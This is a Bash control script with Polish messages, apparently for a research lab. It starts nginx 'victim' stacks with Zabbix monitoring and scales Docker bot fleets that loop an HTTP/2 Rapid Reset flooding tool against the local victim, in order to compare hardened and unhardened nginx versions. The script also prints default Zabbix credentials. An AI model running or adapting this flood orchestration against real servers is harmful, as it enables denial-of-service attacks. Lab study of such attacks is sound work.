#!/usr/bin/env bash
set -uo pipefail

FLEET_CPUSET="${FLEET_CPUSET:-3-7}"
FLEET_CPUS="${FLEET_CPUS:-0.5}"
FLEET_IMAGE="lab-fleetbot:latest"

ROOT="$(cd "$(dirname "$0")" && pwd)"
cd "$ROOT"

C_G='\033[32m'; C_R='\033[31m'; C_Y='\033[33m'; C_B='\033[36m'; C_0='\033[0m'

EXP=""
LABEL=""
PORT=""

dc() { docker compose --env-file "env/${EXP}.env" -f docker-compose.experiment.yml "$@"; }
log() { echo -e "${C_B}[$(date +%H:%M:%S)]${C_0} $*"; }

fleet_names() { docker ps --filter "label=lab-exp=$EXP" --format '{{.Names}}' 2>/dev/null; }
fleet_count() { fleet_names | wc -l; }

_KILL='for d in /proc/[0-9]*; do p=${d#/proc/}; [ "$p" = "1" ] && continue; [ "$p" = "$$" ] && continue; c=$(cat "$d/comm" 2>/dev/null); [ "$c" = "sleep" ] && continue; [ "$c" = "docker-init" ] && continue; kill -9 "$p" 2>/dev/null; done; exit 0'

do_attack() {
  local n="$1"
  local existing
  existing=$(fleet_count)

  if [ "$n" -gt "$existing" ]; then
    log "Dodaje boty: $existing -> $n"
    for i in $(seq $((existing + 1)) "$n"); do
      docker run -d --name "${EXP}-fbot-${i}" --label "lab-exp=$EXP" --init \
        --network "${EXP}_labnet" --cpuset-cpus "$FLEET_CPUSET" --cpus "$FLEET_CPUS" \
        "$FLEET_IMAGE" sleep infinity >/dev/null
    done
  elif [ "$n" -lt "$existing" ]; then
    log "Redukuje boty: $existing -> $n"
    for i in $(seq $((n + 1)) "$existing"); do
      docker rm -f "${EXP}-fbot-${i}" >/dev/null 2>&1
    done
  fi

  log "Odpalam atak na $(fleet_count) botach..."
  local loop='while true; do rapidreset -url https://victim:443 -requests 20000 -concurrency 200 -quiet >/dev/null 2>&1; done'
  for cid in $(fleet_names); do
    docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1
    docker exec -d "$cid" sh -c "$loop"
  done
  log "${C_R}Atak: $(fleet_count) botow${C_0}"
}

do_stop() {
  local names
  names=$(fleet_names)
  [ -z "$names" ] && { log "Brak botow."; return; }
  for cid in $names; do
    docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1
  done
  log "${C_G}Atak zatrzymany. Boty zostaja ($(fleet_count)).${C_0}"
}

do_remove() {
  local names
  names=$(fleet_names)
  [ -z "$names" ] && { log "Brak botow."; return; }
  echo "$names" | xargs docker rm -f >/dev/null 2>&1
  log "Wszystkie boty usuniete."
}

do_up() {
  local envfile="env/${1}.env"
  [ ! -f "$envfile" ] && { log "${C_R}Nie ma pliku $envfile${C_0}"; return 1; }
  EXP="$1"
  LABEL=$(grep EXP_LABEL "$envfile" | cut -d= -f2)
  PORT=$(grep ZABBIX_PORT "$envfile" | cut -d= -f2)

  log "Stawiam stos $LABEL (Zabbix :$PORT) ..."
  dc up -d --build victim zabbix-db zabbix-server zabbix-web probe

  log "Czekam na victim..."
  local i=0
  while [ $i -lt 60 ]; do
    docker run --rm --network "${EXP}_labnet" curlimages/curl:8.8.0 \
      -sk --max-time 2 https://victim/ -o /dev/null 2>/dev/null && break
    i=$((i + 1)); sleep 2
  done
  log "victim gotowy."

  log "Czekam na Zabbix API (moze potrwac ~60s)..."
  local j=0
  while [ $j -lt 90 ]; do
    if curl -s -o /dev/null -w '%{http_code}' -X POST "http://localhost:${PORT}/api_jsonrpc.php" \
      -H 'Content-Type: application/json' \
      -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}' 2>/dev/null | grep -q 200; then
      log "Zabbix API gotowe."
      break
    fi
    j=$((j + 1)); sleep 2
  done

  log "Provisionuje Zabbix..."
  docker run --rm --network "${EXP}_monnet" \
    -e ZBX_URL=http://zabbix-web:8080/api_jsonrpc.php \
    -v "$ROOT/../monitoring:/app" -w /app python:3.12-alpine python provision.py 2>&1 | tail -5
  log "${C_G}Stos $LABEL gotowy. Zabbix: http://localhost:$PORT${C_0}"
}

do_down() {
  [ -z "$EXP" ] && { log "Nie ma aktywnego stosu."; return; }
  do_remove
  dc down -v
  log "Stos $LABEL zamkniety."
  EXP=""; LABEL=""; PORT=""
}

do_status() {
  echo ""
  if [ -n "$EXP" ]; then
    echo -e "  Aktywny eksperyment: ${C_Y}$LABEL${C_0} ($EXP, Zabbix :$PORT)"
    echo -e "  Boty: ${C_R}$(fleet_count)${C_0}"
    echo ""
    docker ps --filter "label=com.docker.compose.project=$EXP" --format 'table {{.Names}}\t{{.Status}}' 2>/dev/null
  else
    echo "  Brak aktywnego eksperymentu."
  fi
  echo ""
  echo "  Wszystkie stosy:"
  for e in env/exp*.env; do
    local name=$(grep COMPOSE_PROJECT_NAME "$e" | cut -d= -f2)
    local lbl=$(grep EXP_LABEL "$e" | cut -d= -f2)
    local p=$(grep ZABBIX_PORT "$e" | cut -d= -f2)
    local running=$(docker ps --filter "label=com.docker.compose.project=$name" -q 2>/dev/null | wc -l)
    if [ "$running" -gt 0 ]; then
      echo -e "    ${C_G}$lbl${C_0} (:$p) — $running kontenerow"
    else
      echo -e "    $lbl (:$p) — wylaczony"
    fi
  done
  echo ""
}

show_help() {
  echo ""
  echo -e "  ${C_Y}Komendy:${C_0}"
  echo "    up <exp>      — odpal stos (exp1/exp2/exp3/exp4)"
  echo "    down          — zamknij aktywny stos"
  echo "    attack <N>    — ustaw N botow i odpal atak"
  echo "    stop          — zatrzymaj atak (boty zostaja)"
  echo "    remove        — usun wszystkie boty"
  echo "    status        — pokaz stan"
  echo "    zabbix        — otworz adres Zabbixa"
  echo "    quit          — wyjdz"
  echo ""
  echo "  ${C_Y}Eksperymenty:${C_0}"
  echo "    exp1 = old-normal    (nginx 1.25.1, bez hardeningu)"
  echo "    exp2 = old-hardened  (nginx 1.25.1, rate-limit)"
  echo "    exp3 = new-normal    (nginx 1.27, bez hardeningu)"
  echo "    exp4 = new-hardened  (nginx 1.27, rate-limit)"
  echo ""
}

# --- Build fleet image ---
if ! docker image inspect "$FLEET_IMAGE" >/dev/null 2>&1; then
  log "Buduje obraz floty..."
  docker build -q -t "$FLEET_IMAGE" ../bot >/dev/null
fi
if ! docker image inspect lab-probe:latest >/dev/null 2>&1; then
  log "Buduje obraz sondy..."
  docker build -q -t lab-probe:latest ../probe >/dev/null
fi
mkdir -p results/old-normal results/old-hardened results/new-normal results/new-hardened

echo ""
echo -e "${C_G}=== DDoS Lab Cloud Control ===${C_0}"
show_help

while true; do
  echo -ne "${C_B}lab>${C_0} "
  read -r cmd arg
  case "$cmd" in
    up)
      [ -z "$arg" ] && { echo "Uzycie: up exp1|exp2|exp3|exp4"; continue; }
      do_up "$arg"
      ;;
    down)       do_down ;;
    attack)
      [ -z "$EXP" ] && { log "Najpierw: up exp1"; continue; }
      [ -z "$arg" ] && { echo "Uzycie: attack <liczba_botow>"; continue; }
      do_attack "$arg"
      ;;
    stop)       do_stop ;;
    remove)     do_remove ;;
    status)     do_status ;;
    zabbix)
      [ -z "$PORT" ] && { log "Brak aktywnego stosu."; continue; }
      local_ip=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
      echo "  http://${local_ip}:${PORT}  (Admin / zabbix)"
      ;;
    help|h)     show_help ;;
    quit|exit|q) echo "Bye."; break ;;
    "")         ;;
    *)          echo "Nieznana komenda: $cmd (wpisz help)" ;;
  esac
done
